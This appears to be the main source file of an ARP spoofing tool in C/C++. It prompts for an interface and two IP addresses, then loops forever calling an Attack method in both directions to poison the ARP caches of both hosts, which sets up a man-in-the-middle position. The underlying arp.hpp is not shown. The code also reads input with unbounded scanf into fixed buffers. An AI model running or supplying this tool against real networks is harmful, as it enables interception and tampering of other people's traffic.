#include "arp.hpp"

#define LOOP		0
#define BROADCAST	1

int main(void)
{
	char intername[100];
	char srcip[100];
	char dstip[100];

	printf("[SYSTEM] Starting ... \n");
	printf("[SYSTEM] ---Interface Name : ");
	scanf("%s", intername);

	ARPSpoofing arp((const char*)intername);

	printf("[SYSTEM] ---source IP : ");
	scanf("%s", srcip);

	printf("[SYSTEM] ---destination IP : ");
	scanf("%s", dstip);

	while(1) {
		sleep(1);

		arp.Attack(srcip, dstip, LOOP, BROADCAST);
		printf("IP : %s ---Spoofing---> IP : %s \n", srcip, dstip);
		arp.Attack(dstip, srcip, LOOP, BROADCAST);
		printf("IP : %s ---Spoofing---> IP : %s \n", dstip, srcip);
	}
	
	return 0;
};
